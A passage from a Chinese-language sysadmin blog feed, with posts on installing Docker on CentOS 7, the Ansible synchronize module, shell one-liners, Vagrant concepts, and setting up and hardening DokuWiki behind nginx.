Public key for docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm is not installed
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3000 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3001 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
Importing GPG key 0x2C52609D:
 Userid     : &quot;Docker Release Tool (releasedocker) &lt;docker@docker.com&gt;&quot;
 Fingerprint: 5811 8e89 f3a9 1289 7c07 0adb f762 2157 2c52 609d
 From       : https://yum.dockerproject.org/gpg
setsebool:  SELinux is disabled.

If you would like to use Docker as a non-root user, you should now consider
adding your user to the &quot;docker&quot; group with something like:

  sudo usermod -aG docker your-user

Remember that you will have to log out and back in for this to take effect!
</code></pre><p>3.启动</p>
<pre><code>service docker start
</code></pre><p>4.测试</p>
<pre><code># docker run hello-world
Unable to find image &apos;hello-world:latest&apos; locally
latest: Pulling from library/hello-world
03f4658f8b78: Pull complete
a3ed95caeb02: Pull complete
Digest: sha256:8be990ef2aeb16dbcb9271ddfe2610fa6658d13f6dfb8bc72074cc1ca36966a7
Status: Downloaded newer image for hello-world:latest

Hello from Docker.
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker Hub account:
 https://hub.docker.com

For more examples and ideas, visit:
 https://docs.docker.com/userguide/
</code></pre><p>5.设置开机启动</p>
<pre><code># chkconfig docker on
Note: Forwarding request to &apos;systemctl enable docker.service&apos;.
Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.
</code></pre><h3 id="u5378_u8F7D"><a href="#u5378_u8F7D" class="headerlink" title="卸载"></a>卸载</h3><pre><code>yum list installed | grep docker
docker-engine.x86_64               1.11.0-1.el7.centos        @docker-main-repo
docker-engine-selinux.noarch       1.11.0-1.el7.centos        @docker-main-repo

yum -y remove docker-engine.x86_64

rm -rf /var/lib/docker
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>环境:阿里云 centos7 镜像</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><p>1.查看内核版本, 如果内核太旧, 请升级到最新版本<]]>
    </summary>
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Ansible synchronize]]></title>
    <link href="http://yoursite.com/2016/04/20/Ansible-synchronize/"/>
    <id>http://yoursite.com/2016/04/20/Ansible-synchronize/</id>
    <published>2016-04-20T12:00:58.000Z</published>
    <updated>2016-04-22T03:53:38.000Z</updated>
    <content type="html"><![CDATA[<p>注意几个参数,[default: no]或者有特殊配置的:</p>
<ul>
<li>copy_links    拷贝软连接的真实文件, 而不是软连接</li>
<li>delete    在进行同步后是否删除 src 中不存在的文件, 默认情况下, 是会保留 dest 目标文件夹原先就存在的文件</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]本地或者委托到目标机</li>
</ul>
<a id="more"></a>
<h3 id="ansible-doc"><a href="#ansible-doc" class="headerlink" title="ansible-doc"></a>ansible-doc</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">&gt; SYNCHRONIZE</span><br><span class="line"></span><br><span class="line">  This <span class="keyword">is</span> a wrapper around rsync. <span class="keyword">Of</span> course you could just use the</span><br><span class="line">  command action <span class="keyword">to</span> <span class="keyword">call</span> rsync yourself, but you also have <span class="keyword">to</span> add a</span><br><span class="line">  fair number <span class="keyword">of</span> boilerplate options <span class="keyword">and</span> host facts. You still may</span><br><span class="line">  need <span class="keyword">to</span> <span class="keyword">call</span> rsync directly via `command<span class="comment">' or `shell' depending on</span></span><br><span class="line">  your use <span class="keyword">case</span>. The synchronize action <span class="keyword">is</span> meant <span class="keyword">to</span> <span class="keyword">do</span> common things</span><br><span class="line">  <span class="keyword">with</span> `rsync<span class="comment">' easily. It does not provide access to the full power of</span></span><br><span class="line">  rsync, but does make most invocations easier <span class="keyword">to</span> follow.</span><br><span class="line"></span><br><span class="line">Options (= <span class="keyword">is</span> mandatory):</span><br><span class="line"></span><br><span class="line">- archive</span><br><span class="line">        Mirrors the rsync archive flag, enables recursive, links,</span><br><span class="line">        perms, times, owner, <span class="keyword">group</span> flags <span class="keyword">and</span> -D. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- checksum</span><br><span class="line">        <span class="keyword">Skip</span> based <span class="keyword">on</span> checksum, rather than <span class="keyword">mod</span>-time &amp; size; Note that</span><br><span class="line">        that <span class="string">"archive"</span> <span class="keyword">option</span> <span class="keyword">is</span> still enabled <span class="keyword">by</span> <span class="keyword">default</span> - the</span><br><span class="line">        <span class="string">"checksum"</span> <span class="keyword">option</span> will <span class="keyword">not</span> disable it. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- compress</span><br><span class="line">        Compress file data during the transfer. <span class="keyword">In</span> most cases, leave</span><br><span class="line">        this enabled unless it causes problems. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- copy_links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> the item that they point <span class="keyword">to</span> (the referent) <span class="keyword">is</span></span><br><span class="line">        copied, rather than the symlink. (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        no]</span><br><span class="line"></span><br><span class="line">- delete</span><br><span class="line">        Delete files that don<span class="comment">'t exist (after transfer, not before) in</span></span><br><span class="line">        the `src<span class="comment">' path. This option requires `recursive=yes'.</span></span><br><span class="line">        (Choices: yes, no) [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">= dest</span><br><span class="line">        Path <span class="keyword">on</span> the destination machine that will be synchronized <span class="keyword">from</span></span><br><span class="line">        the source; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- dest_port</span><br><span class="line">        Port number <span class="keyword">for</span> ssh <span class="keyword">on</span> the destination host. The</span><br><span class="line">        ansible_ssh_port inventory var takes precedence over this</span><br><span class="line">        value. [<span class="keyword">Default</span>: <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">- dirs</span><br><span class="line">        Transfer directories without recursing (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- existing_only</span><br><span class="line">        <span class="keyword">Skip</span> creating <span class="keyword">new</span> files <span class="keyword">on</span> receiver. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- <span class="keyword">group</span></span><br><span class="line">        <span class="keyword">Preserve</span> <span class="keyword">group</span> (Choices: yes, no) [<span class="keyword">Default</span>: the value <span class="keyword">of</span> the</span><br><span class="line">        archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> symlinks. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- mode</span><br><span class="line">        Specify the direction <span class="keyword">of</span> the synchronization. <span class="keyword">In</span> push mode the</span><br><span class="line">        localhost <span class="keyword">or</span> <span class="keyword">delegate</span> <span class="keyword">is</span> the source; <span class="keyword">In</span> pull mode the remote</span><br><span class="line">        host <span class="keyword">in</span> context <span class="keyword">is</span> the source. (Choices: push, pull) [<span class="keyword">Default</span>:</span><br><span class="line">        push]</span><br><span class="line"></span><br><span class="line">- owner</span><br><span class="line">        <span class="keyword">Preserve</span> owner (super user only) (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        the value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- perms</span><br><span class="line">        <span class="keyword">Preserve</span> permissions. (Choices: yes, no) [<span class="keyword">Default</span>: the value</span><br><span class="line">        <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- recursive</span><br><span class="line">        Recurse <span class="keyword">into</span> directories. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- rsync_opts</span><br><span class="line">        Specify additional rsync options <span class="keyword">by</span> passing <span class="keyword">in</span> an array.</span><br><span class="line">        [<span class="keyword">Default</span>: None]</span><br><span class="line"></span><br><span class="line">- rsync_path</span><br><span class="line">        Specify the rsync command <span class="keyword">to</span> run <span class="keyword">on</span> the remote machine. See</span><br><span class="line">        `--rsync-path<span class="comment">' on the rsync man page.</span></span><br><span class="line"></span><br><span class="line">- rsync_timeout</span><br><span class="line">        Specify a --timeout <span class="keyword">for</span> the rsync command <span class="keyword">in</span> seconds.</span><br><span class="line">        [<span class="keyword">Default</span>: <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">- set_remote_user</span><br><span class="line">        put user@ <span class="keyword">for</span> the remote paths. <span class="keyword">If</span> you have a <span class="keyword">custom</span> ssh</span><br><span class="line">        config <span class="keyword">to</span> define the remote user <span class="keyword">for</span> a host that does <span class="keyword">not</span></span><br><span class="line">        match the inventory user, you should <span class="keyword">set</span> this parameter <span class="keyword">to</span></span><br><span class="line">        <span class="string">"no"</span>. [<span class="keyword">Default</span>: <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">= src</span><br><span class="line">        Path <span class="keyword">on</span> the source machine that will be synchronized <span class="keyword">to</span> the</span><br><span class="line">        destination; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- times</span><br><span class="line">        <span class="keyword">Preserve</span> modification times (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">Notes:  rsync must be installed <span class="keyword">on</span> both the local <span class="keyword">and</span> remote machine.</span><br><span class="line">        Inspect the verbose output <span class="keyword">to</span> validate the destination</span><br><span class="line">        user/host/path are what was expected. The remote user <span class="keyword">for</span> the</span><br><span class="line">        dest path will always be the remote_user, <span class="keyword">not</span> the sudo_user.</span><br><span class="line">        Expect that dest=~/x will be ~&lt;remote_user&gt;/x even <span class="keyword">if</span> <span class="keyword">using</span></span><br><span class="line">        sudo. <span class="keyword">To</span> exclude files <span class="keyword">and</span> directories <span class="keyword">from</span> being</span><br><span class="line">        synchronized, you may add `.rsync-filter<span class="comment">' files to the source</span></span><br><span class="line">        directory.</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXAMPLES:</span><br><span class="line"># Synchronization of src on the control machine to dest on the remote hosts</span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path</span><br><span class="line"></span><br><span class="line"># Synchronization without any <span class="comment">--archive options enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path archive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --recursive</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path recursive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --times, with --checksum option enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path <span class="operator"><span class="keyword">checksum</span>=yes times=<span class="keyword">no</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">without</span> <span class="comment">--archive options enabled except use --links</span></span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">archive</span>=<span class="keyword">no</span> links=yes</span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> two paths <span class="keyword">both</span> <span class="keyword">on</span> the control machine</span><br><span class="line">local_action: synchronize src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> the inventory host <span class="keyword">to</span> the dest <span class="keyword">on</span> the localhost <span class="keyword">in</span></span><br><span class="line">pull <span class="keyword">mode</span></span><br><span class="line">synchronize: <span class="keyword">mode</span>=pull src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> <span class="keyword">delegate</span> host <span class="keyword">to</span> dest <span class="keyword">on</span> the <span class="keyword">current</span> inventory host.</span><br><span class="line"># <span class="keyword">If</span> delegate_to <span class="keyword">is</span> <span class="keyword">set</span> <span class="keyword">to</span> the <span class="keyword">current</span> inventory host, this can be used <span class="keyword">to</span> syncronize</span><br><span class="line"># two directories <span class="keyword">on</span> that host. </span><br><span class="line">synchronize: &gt;</span><br><span class="line">    src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line">    delegate_to: <span class="keyword">delegate</span>.host</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">and</span> <span class="keyword">delete</span> files <span class="keyword">in</span> dest <span class="keyword">on</span> the remote host that <span class="keyword">are</span> <span class="keyword">not</span> <span class="keyword">found</span> <span class="keyword">in</span> src <span class="keyword">of</span> localhost.</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">delete</span>=yes</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">using</span> an alternate rsync command</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> rsync_path=<span class="string">"sudo rsync"</span></span><br><span class="line"></span><br><span class="line"># Example .rsync-filter <span class="keyword">file</span> <span class="keyword">in</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">- <span class="keyword">var</span>       # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> whose <span class="keyword">last</span> part <span class="keyword">is</span> <span class="string">'var'</span></span><br><span class="line">- /<span class="keyword">var</span>      # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> <span class="keyword">starting</span> <span class="keyword">with</span> <span class="string">'var'</span> <span class="keyword">starting</span> <span class="keyword">at</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">+ /<span class="keyword">var</span>/conf # <span class="keyword">include</span> /<span class="keyword">var</span>/conf even though it was previously excluded</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">passing</span> <span class="keyword">in</span> extra rsync options</span><br><span class="line">synchronize: src=/tmp/helloworld dest=/<span class="keyword">var</span>/www/helloword rsync_opts=<span class="comment">--no-motd,--exclude=.git</span></span></span><br></pre></td></tr></table></figure>
<h3 id="u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65"><a href="#u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65" class="headerlink" title="用来做生产环境 beta 环境同步"></a>用来做生产环境 beta 环境同步</h3><p>同步 nginx 主目录下的配置, 除了 vhost 配置目录不同步</p>
<p>一个坑:</p>
<pre><code>synchronize: src=~/Documents/eg/svn/everinner_app_beta/config_app dest=/opt/www
</code></pre><p>这个相当于把<code>config_app</code>目录拷贝到<code>/opt/www</code>下, 拷贝后变成<code>/opt/www/config_app</code>, 如果 写成<code>dest=/opt/www/config_app</code>, 拷贝后会变成<code>/opt/www/config_app/config_app</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>注意几个参数,[default: no]或者有特殊配置的:</p>
<ul>
<li>copy_links    拷贝软连接的真实文件, 而不是软连接</li>
<li>delete    在进行同步后是否删除 src 中不存在的文件, 默认情况下, 是会保留 dest 目标文件夹原先就存在的文件</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]本地或者委托到目标机</li>
</ul>]]>
    
    </summary>
    
      <category term="Ansible" scheme="http://yoursite.com/tags/Ansible/"/>
    
      <category term="Synchronize" scheme="http://yoursite.com/tags/Synchronize/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[系统管理常用脚本]]></title>
    <link href="http://yoursite.com/2016/04/19/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/04/19/系统管理常用脚本/</id>
    <published>2016-04-19T09:29:28.000Z</published>
    <updated>2016-05-11T07:02:55.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u6587_u4EF6_u548C_u6587_u4EF6_u5939_u6743_u9650_u9012_u5F52_u4E3A777_uFF0C_u8FD8_u539F_u6210_u9ED8_u8BA4_u7684755_u548C644"><a href="#u6587_u4EF6_u548C_u6587_u4EF6_u5939_u6743_u9650_u9012_u5F52_u4E3A777_uFF0C_u8FD8_u539F_u6210_u9ED8_u8BA4_u7684755_u548C644" class="headerlink" title="文件和文件夹权限递归为777，还原成默认的755和644"></a>文件和文件夹权限递归为777，还原成默认的755和644</h3><pre><code>find . -type f -exec chmod 644 {} +
find ./ -type d |xargs chmod 755
</code></pre><h3 id="u8BB2_ssh/config__u7684_u4E3B_u673A_u4FE1_u606F_u8F6C_u79FB_u5230_ansible_hosts__u6587_u4EF6"><a href="#u8BB2_ssh/config__u7684_u4E3B_u673A_u4FE1_u606F_u8F6C_u79FB_u5230_ansible_hosts__u6587_u4EF6" class="headerlink" title="讲 ssh/config 的主机信息转移到 ansible hosts 文件"></a>讲 ssh/config 的主机信息转移到 ansible hosts 文件</h3><pre><code>awk -F[=\ ] &apos;$2 ~ /HD_Server/ {print &quot;[&quot;$2&quot;]&quot;; a=a$2&quot;\n&quot;}; $1 ~ /Hostname/ {print $2} END{print &quot;[HDS]\n&quot;a}&apos; .ssh/config
</code></pre><p>其中<code>a=a$2&quot;\n&quot;</code> 为字符串连接</p>
<h3 id="u521B_u5EFA_swap"><a href="#u521B_u5EFA_swap" class="headerlink" title="创建 swap"></a>创建 swap</h3><pre><code>[root@node1 ~]# cat create_swap.sh
#!/bin/bash

fallocate -l 512M /swapfile
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
echo &quot;/swapfile none swap defaults 0 0&quot; &gt;&gt;  /etc/fstab
mount -a
free -m
</code></pre><h3 id="awk__u4EA4_u63621_2C2_u5217_2C__u4EE5tab__u4F5C_u4E3A_u5206_u9694_u7B26_u8F93_u51FA"><a href="#awk__u4EA4_u63621_2C2_u5217_2C__u4EE5tab__u4F5C_u4E3A_u5206_u9694_u7B26_u8F93_u51FA" class="headerlink" title="awk 交换1,2列, 以tab 作为分隔符输出"></a>awk 交换1,2列, 以tab 作为分隔符输出</h3><pre><code>awk  -v  OFS=&apos;\t&apos; &apos;{temp=$1;$1=$2;$2=temp;print}&apos; 1.txt
</code></pre><h3 id="u751F_u6210_key"><a href="#u751F_u6210_key" class="headerlink" title="生成 key"></a>生成 key</h3><pre><code>ssh-keygen -f test   -C &quot;test key&quot;
</code></pre><h3 id="u67E5_u770B_u547D_u4EE4_u5BF9_u5E94_u7684_rpm__u5B89_u88C5_u5305"><a href="#u67E5_u770B_u547D_u4EE4_u5BF9_u5E94_u7684_rpm__u5B89_u88C5_u5305" class="headerlink" title="查看命令对应的 rpm 安装包"></a>查看命令对应的 rpm 安装包</h3><p>比如想查看 dig 的:</p>
<pre><code>rpm -qf  `which dig`
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u6587_u4EF6_u548C_u6587_u4EF6_u5939_u6743_u9650_u9012_u5F52_u4E3A777_uFF0C_u8FD8_u539F_u6210_u9ED8_u8BA4_u7684755_u548C644"><a href=]]>
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Vagrant安装使用]]></title>
    <link href="http://yoursite.com/2016/04/14/Vagrant%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2016/04/14/Vagrant安装使用/</id>
    <published>2016-04-14T10:49:01.000Z</published>
    <updated>2016-04-14T11:29:05.000Z</updated>
    <content type="html"><![CDATA[<p>下载,安装</p>
<p>在新 terminal 可以看到 vagrant 命令</p>
<pre><code>$ vagrant --version
Vagrant 1.8.1
</code></pre><h3 id="u51E0_u4E2A_u6982_u5FF5"><a href="#u51E0_u4E2A_u6982_u5FF5" class="headerlink" title="几个概念"></a>几个概念</h3><p><em>Provider</em>：供应商，在这里指Vagrant调用的虚拟化工具。Vagrant本身并没有能力创建虚拟机，它是调用一些虚拟化工具来创建，如VirtualBox、VMWare、Xen、Docker，甚至AWS，这些虚拟化工具只要安装好了，vagrant会自动封装在底层通过统一的命令调用。也就是说使用vagrant时你电脑上还需要安装对应的Provider，默认是免费开源的virtualbox。<br><em>Box</em>：可被Vagrant直接使用的虚拟机镜像文件，大小根据内容的不同从200M-2G不等。针对不同的Provider，Box文件的格式是不一样的，从 vagrantcloud.com 你可以找到社区维护的box。</p>
<p><em>Vagrantfile</em>：Vagrant根据Vagrantfile中的配置来创建虚拟机，是Vagrant的核心。在Vagrantfile文件中你需要指明使用哪个Box（可以下载好的或自己制作，或指定在线的URL地址），虚拟机使用的内存大小和CPU，需要预安装哪些软件，虚拟机的网络配置，与host的共享目录等。</p>
<p><em>Provisioner</em>：是Vagrant的插件的一种。大部分现成的box并不是你正好想要的，通过使用你熟悉的provisioner，比如Puppet，可以在你使用vagrant up启动虚拟机时自动的安装软件、修改配置等初始化操作。当然你也可以在最先启动虚拟机后，使用vagrant ssh进去然后手动安装软件，但毕竟不是所有人都是系统管理员，写好Vagrantfile后无需人工干预马上就可以使用vm。目前支持并实现的provisioning有Puppet、Salt、Ansible、Chef这些知名的自动化运维工具，当然需要一定的使用经验；也可以使用shell provisioner，故名思议这个插件就是通过执行shell命令完成统一的作用。</p>
<p><em>Guest Additions</em>：这个是常在下载 base box 介绍里有的，一般用来实现host到vm的端口转发、目录共享，在开发环境上都建议装上以便测试。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>下载,安装</p>
<p>在新 terminal 可以看到 vagrant 命令</p>
<pre><code>$ vagrant --version
Vagrant 1.8.1
</code></pre><h3 id="u51E0_u4E2A_u6982_u5FF5"><]]>
    </summary>
    
      <category term="vagrant" scheme="http://yoursite.com/tags/vagrant/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安装管理Dokuwiki]]></title>
    <link href="http://yoursite.com/2016/04/14/%E5%AE%89%E8%A3%85%E7%AE%A1%E7%90%86Dokuwiki/"/>
    <id>http://yoursite.com/2016/04/14/安装管理Dokuwiki/</id>
    <published>2016-04-14T04:00:33.000Z</published>
    <updated>2016-04-15T01:39:10.000Z</updated>
    <content type="html"><![CDATA[<p>搭建 lnmp 环境</p>
<p>下载解压, 将解压文件配置为nginx虚拟主机根目录</p>
<p>主要讲下安全设置</p>
<p>主要是禁止直接访问</p>
<ul>
<li>data</li>
<li>conf</li>
<li>bin</li>
</ul>
<p>这三个目录</p>
<p>检测方式是看能否访问到</p>
<p><a href="http://yoursite.com/data/pages/wiki/dokuwiki.txt">http://yoursite.com/data/pages/wiki/dokuwiki.txt</a></p>
<a id="more"></a>
<h3 id="u914D_u7F6Enginx_u7981_u6B62_u8BBF_u95EE_u7279_u5B9A_u76EE_u5F55"><a href="#u914D_u7F6Enginx_u7981_u6B62_u8BBF_u95EE_u7279_u5B9A_u76EE_u5F55" class="headerlink" title="配置nginx禁止访问特定目录"></a>配置nginx禁止访问特定目录</h3><p>一开始打算用 nginx 禁止目录访问功能, 在 nginx 配置了:</p>
<pre><code>location ^~ /(data|conf|bin|inc)/* {
        deny all;
}
</code></pre><h3 id="u6539_u53D8_u6570_u636E_u76EE_u5F55_u4F4D_u7F6E"><a href="#u6539_u53D8_u6570_u636E_u76EE_u5F55_u4F4D_u7F6E" class="headerlink" title="改变数据目录位置"></a>改变数据目录位置</h3><p>当然最好是直接把这些目录迁出网站根目录了</p>
<pre><code># 转移conf
[root@HD_Server_Config dokuwiki-2015-08-10a]# mv conf /data/dokuwiki/
# 添加配置
[root@HD_Server_Config dokuwiki-2015-08-10a]# vim inc/preload.php
&lt;?php

define(&apos;DOKU_CONF&apos;,&apos;/data/dokuwiki/conf/&apos;);

# 转移 data
[root@HD_Server_Config dokuwiki-2015-08-10a]# mv data /data/dokuwiki/
# 添加配置
[root@HD_Server_Config dokuwiki-2015-08-10a]# vim /data/dokuwiki/conf/local.php

$conf[&apos;savedir&apos;] = &apos;/data/dokuwiki/data/&apos;;

# 转移 bin
[root@HD_Server_Config dokuwiki-2015-08-10a]# mv bin /data/dokuwiki/
</code></pre><h3 id="u5B89_u88C5_u63D2_u4EF6"><a href="#u5B89_u88C5_u63D2_u4EF6" class="headerlink" title="安装插件"></a>安装插件</h3><p><strong>管理</strong> -&gt; <strong>扩展管理器</strong></p>
<p><strong>搜索和安装</strong>  </p>
<p><em>swiftmail</em> 配置发送 smtp 邮件, 然后在 <strong>管理</strong> -&gt; <strong>配置设置</strong> -&gt; <strong>插件设置</strong>(右侧边栏处)</p>
<p>smtp_host : smtp.exmail.qq.com</p>
<p>smtp_port: 465</p>
<p>smtp_ssl: SSL</p>
<p>auth_user: smtp 邮箱地址, 比如admin@123.com</p>
<p>auth_pass: 邮箱密码</p>
<p>localdomain: yoursite.com</p>
<p>除此之外, 还需要配置<strong>通知设置</strong></p>
<p>通知设置里的东西全部填上勾上</p>
<p>比如邮件地址都填</p>
<p>admin@123.com</p>
<p>邮件前缀填wiki_admin</p>
<p>设置完之后 <strong>管理</strong> 界面下有个 <strong>检查 SwiftMail 配置</strong></p>
<p><em>imgpaste</em> 在编辑器直接粘贴就可以插入剪贴板中的图片，可以用来快速上传截图。</p>
<p><em>Tag</em>    在文档顶部加入标签 </p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="expansion">&#123;&#123;tag&gt;it mannual&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p><em>cloud</em>  支持标签云</p>
<p><em>Backup Tool</em> 备份工具</p>
<p><em>addnewpage</em>  新建页面功能太隐晦了… 得在 url 那里添加, 所以搞了个插件</p>
<p><em>pagelist</em>    表格形式列出wiki页面列表</p>
<h3 id="u7F16_u8F91"><a href="#u7F16_u8F91" class="headerlink" title="编辑"></a>编辑</h3><p><a href="https://www.dokuwiki.org/start?id=zh:wiki:syntax" target="_blank" rel="external">格式化语法</a></p>
<h3 id="u5347_u7EA7"><a href="#u5347_u7EA7" class="headerlink" title="升级"></a>升级</h3><p><a href="https://www.dokuwiki.org/zh:install:upgrade" target="_blank" rel="external">升级</a></p>
<h3 id="u6279_u91CF_u7528_u6237_u5BFC_u5165"><a href="#u6279_u91CF_u7528_u6237_u5BFC_u5165" class="headerlink" title="批量用户导入"></a>批量用户导入</h3><p>先是创建了2个用户, 然后导出了用户 csv 文件, 看了一下文件结构:</p>
<pre><code>user1,user1,user1@yoursite.cn,user
user2,user2,user2@yoursite.cn,user
</code></pre><p>然后建立一个文件,里面存放用户名:</p>
<pre><code>user3
user4
...
</code></pre><p>最后用 awk 生成 csv 文件</p>
<pre><code>awk &apos;{printf &quot;%s,%s,%s@yoursite.cn,user\n&quot;, $1,$1,$1}&apos; member.txt &gt; member.csv
</code></pre><p>导入 csv 文件即可</p>
<p>参考:</p>
<p><a href="https://www.dokuwiki.org/zh:security" target="_blank" rel="external">Dokuwikiu安全</a></p>
<p><a href="http://drops.wooyun.org/tips/1323" target="_blank" rel="external">Nginx安全配置研究</a></p>
<p><a href="http://www.jianshu.com/p/a6b00b055fcd" target="_blank" rel="external">DokuWiki简介及插件推荐</a></p>
<p><a href="http://www.ligenyuan.cn/wiki/reproduce:dokuwiki_page_name" target="_blank" rel="external">dokuwiki命名空间</a></p>
<p><a href="http://www.baiguo.net/wiki/doku.php?id=wiki:plugins" target="_blank" rel="external">Doku插件整理</a></p>
<p><a href="http://blog.csdn.net/zouhao619/article/details/8523637" target="_blank" rel="external">更换编辑器–我还没空折腾这个…</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>搭建 lnmp 环境</p>
